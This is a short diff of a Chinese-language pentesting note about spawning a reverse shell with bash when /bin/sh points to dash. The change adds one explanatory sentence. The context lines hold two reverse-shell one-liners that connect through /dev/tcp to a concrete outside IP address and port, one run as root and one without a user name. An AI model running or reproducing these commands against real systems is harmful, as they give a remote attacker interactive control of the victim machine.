@@ -39,7 +39,7 @@
 	
 	::
 	
-		当 /bin/sh指向/bin/dash的时候，反弹shell用bash的话必须得这样弹：
+		当 /bin/sh指向/bin/dash的时候，dash这个shell只有运行脚本的能力，而没有交互能力。反弹shell用bash的话必须得这样弹：
 		root bash -c "bash -i  >&/dev/tcp/106.13.124.93/2333 0>&1"
 		ubuntu中，当不能指定用户名
 		bash -c "bash -i  >&/dev/tcp/106.13.124.93/2333 0>&1"
